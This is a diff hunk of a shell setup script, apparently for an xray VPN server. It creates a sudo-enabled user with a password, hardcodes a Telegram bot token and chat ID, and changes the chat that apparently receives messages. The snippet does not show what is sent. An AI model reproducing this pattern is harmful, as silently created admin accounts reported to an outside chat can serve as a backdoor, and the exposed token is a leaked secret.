@@ -1024,7 +1024,7 @@ domain=$(cat /etc/xray/domain)
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="1092475591"
+    CHATID="-1001795539670"
     KEY="6921639569:AAFPn9bU8-Klt9Xs41IToMAK2BvufFKAdVI"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
